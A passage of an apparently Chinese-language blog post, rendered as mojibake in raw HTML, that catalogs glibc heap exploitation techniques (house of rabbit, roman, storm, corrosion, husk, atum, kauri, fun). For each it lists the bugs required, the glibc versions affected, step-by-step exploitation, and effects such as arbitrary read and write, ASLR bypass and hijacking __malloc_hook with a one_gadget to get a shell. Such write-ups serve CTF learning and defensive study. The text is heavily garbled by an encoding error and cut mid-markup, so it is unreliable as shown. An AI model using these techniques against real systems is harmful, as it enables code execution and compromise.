ä¸­ï¼Œå¹¶è¿›è¡Œåˆå¹¶ã€‚ä»¥ä¿®æ”¹ <code>fd</code> ä¸ºä¾‹ï¼Œåˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk A</code>ã€<code>chunk B</code>ï¼Œå…¶ä¸­ <code>chunk A</code> çš„å¤§å°ä½äº <code>fastbin</code> èŒƒå›´</li><li>é‡Šæ”¾ <code>chunk A</code>ï¼Œä½¿å…¶è¿›å…¥åˆ° <code>fastbin</code></li><li>åˆ©ç”¨ <code>use after free</code>ï¼Œä¿®æ”¹ <code>A-&gt;fd</code> æŒ‡å‘åœ°å€ <code>X</code>ï¼Œéœ€è¦ä¼ªé€ å¥½ <code>fake chunk</code>ï¼Œä½¿å…¶ä¸æ‰§è¡Œ <code>unlink</code> æˆ–è€…ç»•è¿‡ <code>unlink</code></li><li>åˆ†é…è¶³å¤Ÿå¤§çš„ <code>chunk</code>ï¼Œæˆ–è€…é‡Šæ”¾ <code>0x10000</code> ä»¥ä¸Šçš„ <code>chunk</code>ï¼Œåªè¦èƒ½è§¦å‘ <code>malloc_consolidate</code> å³å¯</li><li>æ­¤æ—¶ <code>fake chunk</code> è¢«æ”¾åˆ°äº† <code>unsortedbin</code>ï¼Œæˆ–è€…è¿›å…¥åˆ°å¯¹åº”çš„ <code>smallbin/largebin</code></li><li>å–å‡º <code>fake chunk</code> è¿›è¡Œè¯»å†™å³å¯</li></ul><h3 id="ç›¸å…³æŠ€å·§-5"><a href="#ç›¸å…³æŠ€å·§-5" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li><code>2.26</code> åŠ å…¥äº† <code>unlink</code> å¯¹ <code>presize</code> çš„æ£€æŸ¥</li><li><code>2.27</code> åŠ å…¥äº† <code>fastbin</code> çš„æ£€æŸ¥</li></ul><p>æŠ“ä½é‡ç‚¹ï¼š<code>house of rabbit</code> æ˜¯å¯¹ <code>malloc_consolidate</code> çš„åˆ©ç”¨ã€‚å› æ­¤ï¼Œä¸ä¸€å®šè¦æŒ‰ç…§åŸä½œè€…çš„æ€è·¯æ¥ï¼Œä»–çš„æ€è·¯éœ€è¦æ»¡è¶³çš„æ¡ä»¶å¤ªå¤šäº†ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-5"><a href="#åˆ©ç”¨æ•ˆæœ-5" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li><li>ä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="2-7-house-of-roman"><a href="#2-7-house-of-roman" class="headerlink" title="2.7-house of roman"></a>2.7-house of roman</h2><h3 id="æ¼æ´æˆå› -6"><a href="#æ¼æ´æˆå› -6" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p><code>use after free</code>ã€å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-6"><a href="#é€‚ç”¨èŒƒå›´-6" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.29</code></li><li>å¯ä»¥ <code>use after edit</code></li><li>ä¸éœ€è¦æ³„éœ²åœ°å€</li><li>éœ€è¦çˆ†ç ´ <code>12 bit</code>ï¼ŒæˆåŠŸçš„æ¦‚ç‡ <code>1/4096</code></li></ul><h3 id="åˆ©ç”¨åŸç†-6"><a href="#åˆ©ç”¨åŸç†-6" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>å¯ä»¥è¯´è¿™ä¸ªæŠ€å·§æ˜¯ <code>fastbin attack + unsortedbin attack</code> çš„ç»„åˆæŠ€ï¼Œåˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk A</code>ã€<code>chunk B</code>ã€<code>chunk C</code> å’Œ <code>chunk D</code>ï¼Œ<code>chunk B</code> çš„å¤§å°ä¸º <code>0x70</code></li><li>é‡Šæ”¾ <code>chunk B</code>ï¼Œä½¿å…¶è¿›å…¥åˆ° <code>fastbin[0x70]</code></li><li>æº¢å‡ºå†™ <code>A</code>ï¼Œä¿®æ”¹ <code>chunk B</code> çš„ <code>size</code>ï¼Œä½¿å…¶å¤§å°åœ¨ <code>unsortedbin</code> èŒƒå›´</li><li>å†æ¬¡é‡Šæ”¾ <code>B</code>ï¼Œ<code>B</code> è¿›å…¥ <code>unsortedbin</code> ä¸­</li><li>éƒ¨åˆ†å†™ <code>B</code> çš„ <code>fd</code>ï¼Œä½¿å¾— <code>fd</code> æŒ‡å‘ <code>malloc_hook-0x23</code></li><li>åˆ©ç”¨ <code>A</code> çš„æº¢å‡ºå†™ä¿®æ­£ <code>B</code> çš„ <code>size</code>ï¼Œè¿ç»­åˆ†é…ä¸¤æ¬¡ <code>0x70</code>ï¼Œå³å¯åˆ†é…åˆ° <code>malloc_hook</code> ä¸Šæ–¹</li><li>è§¦å‘ <code>unsortedbin attack</code>ï¼Œå°†<code>__malloc_hook</code> å†™ä¸º <code>main_arena+88</code></li><li>éƒ¨åˆ†å†™<code>__malloc_hook</code> çš„ä½ä¸‰ä¸ªå­—èŠ‚ï¼Œä¿®æ”¹ä¸º <code>one_gadget</code></li><li>å†æ¬¡ <code>malloc</code> å³å¯æ‹¿åˆ° <code>shell</code></li></ul><h3 id="ç›¸å…³æŠ€å·§-6"><a href="#ç›¸å…³æŠ€å·§-6" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>ä½¿ç”¨ <code>house of roman</code> çš„æ—¶å€™ï¼Œéœ€è¦é‡‡ç”¨å¤šçº¿ç¨‹çˆ†ç ´</li><li>å¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•ä»£æ›¿ï¼Œæ¯”å¦‚å…ˆæ”»å‡» <code>stdout</code> æ³„éœ²åœ°å€ï¼Œä½¿å¾—çˆ†ç ´çš„æˆæœ¬é™ä½</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-6"><a href="#åˆ©ç”¨æ•ˆæœ-6" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>æ‰§è¡Œ <code>one_gadget</code></li><li>ç»•è¿‡ <code>ASLR</code></li></ul><h2 id="2-8-house-of-storm"><a href="#2-8-house-of-storm" class="headerlink" title="2.8-house of storm"></a>2.8-house of storm</h2><h3 id="æ¼æ´æˆå› -7"><a href="#æ¼æ´æˆå› -7" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºã€<code>use after free</code>ã€<code>edit after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-7"><a href="#é€‚ç”¨èŒƒå›´-7" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.29</code></li><li>å¯ä»¥è¿›è¡Œ <code>unsortedbin attack</code></li><li>å¯ä»¥è¿›è¡Œ <code>largebin attack</code>ï¼Œä¿®æ”¹ <code>bk</code> å’Œ <code>bk_nextsize</code></li><li>å¯ä»¥åˆ†é… <code>0x50</code> å¤§å°çš„ <code>chunk</code></li></ul><h3 id="åˆ©ç”¨åŸç†-7"><a href="#åˆ©ç”¨åŸç†-7" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><code>house of storm</code> ä¹Ÿæ˜¯ä¸€æ¬¾ç»„åˆæŠ€ï¼Œåˆ©ç”¨å¼€å¯äº† <code>PIE</code> çš„ <code>x64</code> ç¨‹åºçš„å †åœ°å€æ€»æ˜¯ <code>0x55xxxx...</code> æˆ–è€… <code>0x56xxxx...</code> å¼€å¤´è¿™ä¸€ç‰¹æ€§ï¼Œä½¿ç”¨ä¸€æ¬¡ <code>largebin attack</code> å†™ä¸¤ä¸ªå †åœ°å€ï¼Œä½¿ç”¨ä¸€æ¬¡ <code>unsortedbin attack</code> å†™ä¸€æ¬¡ <code>libc</code> åœ°å€ï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€åˆ†é…ã€‚è™½ç„¶ <code>house of storm</code> æœ€åèƒ½è¾¾åˆ°ä»»æ„åœ°å€åˆ†é…ï¼Œä½†æ˜¯ç”±äºå…¶æ‰€éœ€çš„æ¡ä»¶æ¯”è¾ƒå¤šï¼Œä¸€èˆ¬å¯ä»¥ç”¨å…¶ä»–æ›´ç®€ä¾¿çš„å †åˆ©ç”¨æŠ€æœ¯ä»£æ›¿ã€‚åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>è¿›è¡Œä¸€æ¬¡ <code>unsortedbin attack</code>ï¼Œå…¶ <code>bk</code> ä¿®æ”¹ä¸º <code>addr</code></li><li>è¿›è¡Œä¸€æ¬¡ <code>largebin attack</code>ï¼Œå…¶ <code>bk</code> ä¿®æ”¹ä¸º <code>addr+0x10</code>ï¼Œ<code>bk_nextsize</code> ä¿®æ”¹ä¸º <code>addr-0x20+3</code></li><li>ç”³è¯· <code>0x50</code> å¤§å°çš„ <code>chunk</code> å³å¯ç”³è¯·åˆ° <code>addr</code> å¤„</li></ul><h3 id="ç›¸å…³æŠ€å·§-7"><a href="#ç›¸å…³æŠ€å·§-7" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>éœ€è¦æ³¨æ„çš„æœ‰ï¼š</p><ul><li>è¯¥æ–¹æ³•æˆåŠŸçš„å‡ ç‡æ˜¯ <code>50%</code>ï¼Œå› ä¸º <code>0x55</code> ä¼šè§¦å‘ <code>assert</code> æ–­è¨€ï¼Œ<code>0x56</code> æ‰èƒ½æˆåŠŸ</li><li>ç”³è¯· <code>addr</code> å¤„çš„ <code>chunk</code> çš„æ—¶å€™éœ€è¦ä» <code>unsortedbin</code> é‡Œé¢å–</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-7"><a href="#åˆ©ç”¨æ•ˆæœ-7" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li></ul><h2 id="2-9-house-of-corrosion"><a href="#2-9-house-of-corrosion" class="headerlink" title="2.9-house of corrosion"></a>2.9-house of corrosion</h2><h3 id="æ¼æ´æˆå› -8"><a href="#æ¼æ´æˆå› -8" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºã€<code>use after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-8"><a href="#é€‚ç”¨èŒƒå›´-8" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>ä»»æ„å¤§å°åˆ†é…</li><li>å¯ä»¥ä¿®æ”¹ <code>global_max_fast</code></li><li>ä¸éœ€è¦æ³„éœ²åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-8"><a href="#åˆ©ç”¨åŸç†-8" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>ä¸€ä¸ªéå¸¸ <code>tricky</code> çš„æ–¹æ³•ï¼Œå¯ä»¥ç»•è¿‡ <code>aslr</code>ï¼Œä¸éœ€è¦æ³„éœ²åœ°å€éƒ½èƒ½è¾¾æˆ <code>rce</code>ï¼Œå¯ä»¥å¾ˆå¾ˆå¤šæ–¹æ³•ç»“åˆèµ·æ¥åº”ç”¨ã€‚å…ˆè¯´åˆ©ç”¨åŸç†ï¼š</p><ul><li>ä½¿ç”¨ <code>unsortedbin attack/largebin attack</code> ç­‰æ–¹æ³•ï¼ŒæˆåŠŸä¿®æ”¹ <code>global_max_fast</code> çš„å€¼ä¸ºå¾ˆå¤§çš„å€¼ã€‚å¦‚æœä½¿ç”¨ <code>unsortedbin attack</code>ï¼Œä¸éœ€è¦æ³„éœ²åœ°å€ï¼Œçˆ†ç ´ <code>1/16</code> å³å¯</li><li>ç”³è¯·ä»»æ„å¤§å°çš„ <code>chunk</code>ï¼Œè¿™äº› <code>chunk</code> éƒ½ä¼šè¢«è§†ä¸º <code>fastbin chunk</code>ï¼Œç„¶ååˆ©ç”¨è¿™äº› <code>chunk</code> æ¥è¿›è¡Œè¯»å’Œå†™</li></ul><p>æ­¤æ—¶çš„è®¡ç®—å…¬å¼ä¸ºï¼š</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chunk</span> size = (chunk addr - &amp;main_arena.fastbinsY) x <span class="hljs-number">2</span> + <span class="hljs-number">0</span>x20<br></code></pre></td></tr></tbody></table></figure><p>è¯»åŸè¯­ï¼š</p><ul><li>å‡è®¾å¯¹åº”çš„åœ°å€ <code>X</code> ä¸Šå­˜å‚¨ç€ <code>Y</code>ï¼Œç°åœ¨çš„ç›®çš„æ˜¯æ³„éœ²å‡º <code>Y</code></li><li>æ ¹æ®åç§»è®¡ç®—å‡ºæ¥ <code>chunk size</code>ï¼Œä¿®æ”¹ <code>chunk A</code> çš„ <code>size</code> ä¸ºè®¡ç®—å‡ºæ¥çš„å€¼ï¼Œé‡Šæ”¾ <code>chunk A</code> åˆ°åœ°å€ <code>X</code> å¤„</li><li>æ­¤æ—¶ï¼Œ<code>A-&gt;fd</code> å°±è¢«å†™å…¥äº† <code>Y</code></li><li>é€šè¿‡æ‰“å°å³å¯æ³„éœ²å‡º <code>Y</code> çš„ä¿¡æ¯</li></ul><p>å†™åŸè¯­ <code>1</code>ï¼š</p><ul><li>å‡è®¾å¯¹åº”çš„åœ°å€ <code>X</code> ä¸Šå­˜å‚¨ç€ <code>Y</code>ï¼Œç°åœ¨çš„ç›®çš„æ˜¯ä¿®æ”¹åœ°å€ <code>X</code> å­˜å‚¨çš„ <code>Y</code> ä¸ºå…¶ä»–å€¼</li><li>æ ¹æ®åç§»è®¡ç®—å‡ºæ¥ <code>chunk size</code>ï¼Œä¿®æ”¹ <code>chunk A</code> çš„ <code>size</code> ä¸ºè®¡ç®—å‡ºæ¥çš„å€¼ï¼Œé‡Šæ”¾ <code>chunk A</code> åˆ°åœ°å€ <code>X</code> å¤„</li><li>æ­¤æ—¶ï¼Œ<code>A-&gt;fd</code> å°±è¢«å†™å…¥äº† <code>Y</code></li><li>ä¿®æ”¹ <code>A-&gt;fd</code> ä¸ºç›®æ ‡å€¼</li><li>åˆ†é…ä¸€æ¬¡ <code>chunk A</code> å°±å¯ä»¥æŠŠåœ°å€ <code>X</code> å­˜å‚¨çš„å€¼ä¸ºä»»æ„å€¼</li></ul><p>å†™åŸè¯­ <code>2</code>ï¼š</p><ul><li>å‡è®¾åœ°å€ <code>X</code> ä¸Šå­˜å‚¨ç€ <code>Y</code>ã€åœ°å€ <code>M</code> ä¸Šå­˜å‚¨ç€ <code>N</code>ï¼Œç°åœ¨çš„ç›®çš„æ˜¯æŠŠ <code>N</code> å†™åˆ°åœ°å€ <code>X</code> å¤„</li><li>æ ¹æ®åç§»è®¡ç®— <code>chunk size1</code>ï¼Œå…ˆé‡Šæ”¾ <code>chunk A</code> åˆ°åœ°å€ <code>X</code> å¤„ï¼Œæ­¤æ—¶æœ‰åœ°å€ <code>X</code> å¤„å­˜å‚¨ <code>chunk A</code> åœ°å€ï¼Œ<code>chunk A-&gt;fd</code> ä¸º <code>Y</code></li><li>æ ¹æ®åç§»è®¡ç®— <code>chunk size2</code>ï¼Œå†æ¬¡é‡Šæ”¾ <code>chunk A</code> åˆ°åœ°å€ <code>M</code> å¤„ï¼Œæ­¤æ—¶æœ‰åœ°å€ <code>M</code> å¤„å­˜å‚¨ <code>chunk A</code> åœ°å€ï¼Œ<code>chunk A-&gt;fd</code> ä¸º <code>N</code></li><li>ä¿®æ­£ <code>chunk A</code> çš„å¤§å°ä¸º <code>chunk size1</code>ï¼Œåˆ†é… <code>1</code> æ¬¡ <code>chunk</code> å³å¯ä½¿å¾— <code>N</code> è½¬ç§»åˆ°åœ°å€ <code>X</code> å¤„ï¼Œå½“ç„¶åœ¨è½¬ç§»çš„è¿‡ç¨‹ä¸­å¯ä»¥é€‚å½“çš„ä¿®æ”¹ <code>N</code></li></ul><p>æ˜¾ç„¶ï¼Œå€ŸåŠ©å†™åŸè¯­ <code>2</code>ï¼Œå³å¯åœ¨ä¸éœ€è¦æ³„éœ²åœ°å€çš„å‰æä¸‹å°†<code>__malloc_hook</code> ç­‰å†™ä¸º <code>one_gadget</code>ï¼Œçˆ†ç ´çš„æ¦‚ç‡æ˜¯ <code>1/4096</code>ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-8"><a href="#ç›¸å…³æŠ€å·§-8" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>è™½ç„¶è‡³ä»Šéƒ½èƒ½ä½¿ç”¨ <code>house of corrosion</code>ï¼Œä½†æ˜¯åœ¨ <code>glibc-2.37</code> ç‰ˆæœ¬ä¸­ï¼Œ<code>global_max_fast</code> çš„æ•°æ®ç±»å‹è¢«ä¿®æ”¹ä¸ºäº† <code>int8_u</code>ï¼Œè¿›è€Œå¯¼è‡´å¯æ§çš„ç©ºé—´èŒƒå›´å¤§å¹…åº¦ç¼©å°ã€‚</li><li><code>house of corrosion</code> ä¹Ÿå¯ä»¥æ‹“å±•åˆ° <code>tcachebin</code> ä¸Š</li><li>é€‚å½“æ§åˆ¶ <code>global_max_fast</code> çš„å¤§å°ï¼ŒæŠŠæ¡æ§åˆ¶çš„ç©ºé—´èŒƒå›´</li><li>å¯ä»¥å’Œ <code>IO_FILE</code> ç»“åˆèµ·æ¥æ³„éœ²ä¿¡æ¯</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-8"><a href="#åˆ©ç”¨æ•ˆæœ-8" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li><code>glibc</code> ä¸Šçš„åœ°å€æ³„éœ²</li><li>æ‰§è¡Œ <code>one_gadget</code></li></ul><h2 id="2-10-house-of-husk"><a href="#2-10-house-of-husk" class="headerlink" title="2.10-house of husk"></a>2.10-house of husk</h2><h3 id="æ¼æ´æˆå› -9"><a href="#æ¼æ´æˆå› -9" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-9"><a href="#é€‚ç”¨èŒƒå›´-9" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥ä¿®æ”¹<code>__printf_arginfo_table</code> å’Œ<code>__printf_function_table</code></li><li>å¯è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²è§£æ</li></ul><h3 id="åˆ©ç”¨åŸç†-9"><a href="#åˆ©ç”¨åŸç†-9" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>ä¸¥æ ¼æ¥è¯´ï¼Œè¿™ä¸ªæ¼æ´æ˜¯ä¸å †çš„å…³ç³»å¹¶ä¸æ˜¯å¾ˆå¤§ï¼Œä¸»è¦æ˜¯æ ¹æ® <code>printf</code> çš„æœºåˆ¶è¿›è¡Œåˆ©ç”¨ã€‚ä½†æ˜¯ï¼Œè¯¥æŠ€æœ¯å¯ä»¥å’Œå¾ˆå¤šå †åˆ©ç”¨æ‰‹æ³•ç»“åˆèµ·æ¥ã€‚</p><p>è°ƒç”¨å¤„ <code>1</code>ï¼š</p><p>åˆ©ç”¨æ–¹å¼ä¸ºï¼š</p><ul><li><code>__printf_function_table</code> å’Œ<code>__printf_arginfo_table</code> åˆ†åˆ«å†™ä¸º <code>chunk A</code> å’Œ <code>chunk B</code> çš„åœ°å€</li><li>è®¾å ä½ç¬¦ä¸º <code>Î±</code>ï¼Œæ­¤æ—¶ <code>chunk B</code> çš„å†…å®¹åº”è¯¥ä¸º <code>p64(0) x ord(Î±-2) + p64(one_gadget)</code></li></ul><p>è°ƒç”¨å¤„ <code>2</code>ï¼š</p><p>åˆ©ç”¨æ–¹å¼ä¸ºï¼š</p><ul><li><code>__printf_function_table</code> å’Œ<code>__printf_arginfo_table</code> åˆ†åˆ«å†™ä¸º <code>chunk A</code> å’Œ <code>chunk B</code> çš„åœ°å€</li><li>è®¾å ä½ç¬¦ä¸º <code>Î±</code>ï¼Œæ­¤æ—¶ <code>chunk A</code> çš„å†…å®¹åº”è¯¥ä¸º <code>p64(0) x ord(Î±-2) + p64(one_gadget)</code></li></ul><p>è¯¥å¤„è°ƒç”¨åœ¨é«˜ç‰ˆæœ¬è¢«åˆ é™¤ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-9"><a href="#ç›¸å…³æŠ€å·§-9" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>è¯¥æŠ€å·§ä¸€èˆ¬å’Œ <code>largebin attack</code> ç»“åˆèµ·æ¥</li><li>åœ¨ä½äº <code>2.36</code> ç‰ˆæœ¬ä¸­ï¼Œ<code>__malloc_assert</code> ä¸­æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è§£æ</li><li>è¿˜æœ‰ä¸€ä¸ª<code>__printf_va_arg_table</code> ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯æ¡ä»¶æ¯”è¾ƒè‹›åˆ»</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-9"><a href="#åˆ©ç”¨æ•ˆæœ-9" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>æ‰§è¡Œ <code>one_gadget</code></li><li>æ‰§è¡Œ <code>rop</code> æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</li></ul><h2 id="2-11-house-of-atum"><a href="#2-11-house-of-atum" class="headerlink" title="2.11-house of atum"></a>2.11-house of atum</h2><h3 id="æ¼æ´æˆå› -10"><a href="#æ¼æ´æˆå› -10" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">edit</span> after free<br></code></pre></td></tr></tbody></table></figure><h3 id="é€‚ç”¨èŒƒå›´-10"><a href="#é€‚ç”¨èŒƒå›´-10" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€”<code>2.30</code></li><li>å¯ä»¥ä¿®æ”¹ <code>tcachebin</code> çš„ <code>next</code> å’Œ <code>key</code></li></ul><h3 id="åˆ©ç”¨åŸç†-10"><a href="#åˆ©ç”¨åŸç†-10" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>è¿™æ˜¯ä¸€ä¸ªå…³äº <code>tcachebin</code> çš„æŠ€å·§ï¼Œç”¨äºä¿®æ”¹ <code>chunk presize/size</code>ï¼Œåˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk A</code>ï¼Œå¤§å°åœ¨ <code>fastbin</code> èŒƒå›´å†…</li><li>é‡Šæ”¾ <code>A</code>ï¼Œè¿ç»­é‡Šæ”¾ <code>8</code> æ¬¡ï¼Œæ­¤æ—¶ï¼Œ<code>A</code> çš„ <code>fd</code> è¢«æ¸… <code>0</code>ï¼Œ<code>A</code> ä¹Ÿè¢«æ”¾ç½®åˆ°äº† <code>fastbin</code> é‡Œé¢</li><li>ç”³è¯·ä¸€ä¸ª <code>chunk</code>ï¼Œå°†å…¶ <code>fd</code> ä¿®æ”¹ä¸º <code>A - 0x10</code>ï¼Œæ­¤æ—¶ <code>tcache</code> ä¸­çš„ <code>counts</code> ä¸º <code>6</code></li><li>å†ç”³è¯·ä¸€ä¸ª <code>chunk</code>ï¼Œä» <code>fastbin</code> é‡Œé¢å–ï¼Œä½†æ˜¯ä¼šæŠŠ <code>fastbin</code> é‡Œé¢å‰©ä½™çš„ä¸€ä¸ª <code>chunk</code> é“¾å…¥åˆ° <code>tcachebin</code></li><li>å†æ¬¡åˆ†é…å°±ä¼šåˆ†é…åˆ°åœ°å€ <code>A-0x10</code> å¤„ï¼Œå°±å¯ä»¥ä¿®æ”¹åŸæ¥ <code>A</code> çš„ <code>presize/size</code> ç­‰</li></ul><h3 id="ç›¸å…³æŠ€å·§-10"><a href="#ç›¸å…³æŠ€å·§-10" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li><code>2.30</code> ä¹‹åé€»è¾‘å˜äº†ï¼ŒåŸæ¥æ˜¯åˆ¤æ–­ <code>entry[idx]!=NULL</code>ï¼Œ<code>2.31</code> ä¹‹ååˆ¤æ–­ <code>count[idx] &gt; 0</code></li><li>æœ‰æ—¶å€™éœ€è¦ç»•è¿‡ <code>tcache-&gt;key</code> çš„æ£€æµ‹</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-10"><a href="#åˆ©ç”¨æ•ˆæœ-10" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä¿®æ”¹ <code>chunk size</code> ä»¥åŠ <code>chunk presize</code></li></ul><h2 id="2-12-house-of-kauri"><a href="#2-12-house-of-kauri" class="headerlink" title="2.12-house of kauri"></a>2.12-house of kauri</h2><h3 id="æ¼æ´æˆå› -11"><a href="#æ¼æ´æˆå› -11" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-11"><a href="#é€‚ç”¨èŒƒå›´-11" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€”<code>2.32</code></li></ul><h3 id="åˆ©ç”¨åŸç†-11"><a href="#åˆ©ç”¨åŸç†-11" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åˆ©ç”¨åŸç†å¾ˆç®€å•ï¼Œä¿®æ”¹ <code>tcachebin</code> çš„ <code>size</code>ï¼Œç„¶åä½¿å…¶è¢«æ”¾åˆ°ä¸åŒå¤§å°çš„ <code>tcachebin</code> é“¾è¡¨é‡Œé¢å»ã€‚æˆ‘æ„Ÿè§‰è¿™ä¸ªæŠ€å·§æ˜¯å¾ˆåŸºç¡€çš„ <code>tcachebin</code> æŠ€å·§ï¼Œç”šè‡³ä¸åº”è¯¥è¢«ç§°ä¹‹ä¸º <code>house of</code>ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-11"><a href="#ç›¸å…³æŠ€å·§-11" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>æ— </li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-11"><a href="#åˆ©ç”¨æ•ˆæœ-11" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>å¤šä¸ª <code>tcachebin</code> é“¾è¡¨ä¸­å­˜æ”¾åŒä¸€ä¸ª <code>chunk</code></li></ul><h2 id="2-13-house-of-fun"><a href="#2-13-house-of-fun" class="headerlink" title="2.13-house of fun"></a>2.13-house of fun</h2><h3 id="æ¼æ´æˆå› -12"><a href="#æ¼æ´æˆå› -12" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºã€<code>use after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-12"><a href="#é€‚ç”¨èŒƒå›´-12" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.30</code></li><li>å¯ä»¥ç”³è¯· <code>largebin</code> èŒƒå›´çš„ <code>chunk</code></li></ul><h3 id="åˆ©ç”¨åŸç†-12"><a href="#åˆ©ç”¨åŸç†-12" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>æˆ–è®¸è¿™ä¸ªæŠ€å·§åº”è¯¥å«åš <code>largebin attack</code>ã€‚</p><p>åœ¨è¿™ä¸ª <a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=801ba1f499b566e677b763fc84f8ba86f4f7ccd0;hp=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=5b06f538c5aee0389ed034f60d90a8884d6d54de;hpb=a0a0dc83173ce11ff45105fd32e5d14356cdfb9c">sourceware.org Git - glibc.git/blobdiff - malloc/malloc.c</a><code>commit</code> è¢«æ£€æµ‹äº†ï¼š</p><p class='item-img' data-src='https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230306115614058.png'><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230306115614058.png" alt="image-20230306115614058"></p><h3 id="ç›¸å…³æŠ€å·§-12"><a href="#ç›¸å…³æŠ€å·§-12" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>æ— </li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-12"><a 